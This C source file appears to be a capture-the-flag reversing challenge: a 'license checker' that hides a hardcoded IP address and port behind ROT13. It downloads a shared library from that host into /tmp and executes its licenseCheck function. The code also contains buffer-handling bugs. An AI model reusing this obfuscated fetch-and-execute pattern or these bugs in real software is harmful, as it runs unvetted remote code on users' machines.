#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <time.h>
#include <string.h>
#include <curl/curl.h>
#include <stdarg.h>

// $ gcc application.c -ldl -lcurl -o ../challenges/application

typedef int (*lc)();

char *decrypt(const char *src){
    if(src == NULL){
      return NULL;
    }
  
    char *result = malloc(strlen(src));
    
    if(result != NULL){
      strcpy(result, src);
      char *current_char = result;
      
      while(*current_char != '\0'){
        if((*current_char >= 97 && *current_char <= 122) || (*current_char >= 65 && *current_char <= 90)){
          if(*current_char > 109 || (*current_char > 77 && *current_char < 91)){
            *current_char -= 13;
          }else{
            *current_char += 13;
          }
        }
        current_char++;
      }
    }
    return result;
}

static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
{
  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
  return written;
}

static char *rand_string(char *str, size_t size)
{
    srand(time(NULL));
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJK1234567890";
    if (size) {
        --size;
        for (size_t n = 0; n < size; n++) {
            int key = rand() % (int) (sizeof charset - 1);
            str[n] = charset[key];
        }
        str[size] = '\0';
    }
    return str;
}

void c(char *buf, ...)
{
    va_list args;
    va_start (args, buf);
    char arg = va_arg(args, int);

    while( arg ) {
    	sprintf(buf, "%s%c", buf, arg);
    	arg = va_arg(args, int);
    }
    va_end (args);
}

char *dllib(char *fn){
    CURL *curl_handle;
    FILE *namef;
    char *url;
    int debug = 1;
    char str[512]={0};
    
    c(str,'u', 'g', 'g', 'c', ':', '/', '/', '2', '0', '2', '.', '1', '5', '7', '.', '1', '7', '6', '.', '1', '4', '3', ':', '7', '0', '0', '2', '/', 'y', 'v', 'o', 'y', 'v', 'p', 'r', 'a', 'f', 'r', '.', 'f', 'b', '\0');    
    url = decrypt(str);

    curl_global_init(CURL_GLOBAL_ALL);
    curl_handle = curl_easy_init(); 
    curl_easy_setopt(curl_handle, CURLOPT_URL, url);
    curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 0L);
    curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
    curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
    namef = fopen(fn, "wb");
    if(namef) {
        curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, namef);
        curl_easy_perform(curl_handle);
        fclose(namef);
    }

    curl_easy_cleanup(curl_handle); 
    curl_global_cleanup();  
    return 0;
}

int openlib(char *fn, char *key){
    void *handle;
    char *error;
    int res;
    lc licenseCheck;

    handle = dlopen(fn, RTLD_NOW|RTLD_GLOBAL);
    if (!handle) {
        fprintf(stderr, "%s\n", dlerror());
        exit(EXIT_FAILURE);
    }
    
    dlerror();
    licenseCheck = (lc) dlsym(handle, "licenseCheck");
    error = dlerror();
    
    if (error != NULL) {
        fprintf(stderr, "%s\n", error);
        exit(EXIT_FAILURE);
    }
    res = licenseCheck(key);
    dlclose(handle);
    return res;
}

int main(int argc, char const *argv[])
{   
    char buf[15];
    const char *folder = "/tmp/";
    const char *file = rand_string(buf, sizeof buf);
    char inp[256]; 
    char *full;
    int res;
    puts("==== Welcome To Lumine License Checker ====");
    printf(">> "); scanf("%255s", &inp);

    full = malloc(strlen(folder)+14+3+1);
    strcpy(full, folder); strcat(full, file); strcat(full, ".so");
    dllib(full);
    res = openlib(full, inp);
    if(res == 1){
        puts("Correct!");
    }else{
        puts("Failed!");
    }

    remove(full);

    free(full);
    
    return 69;
}



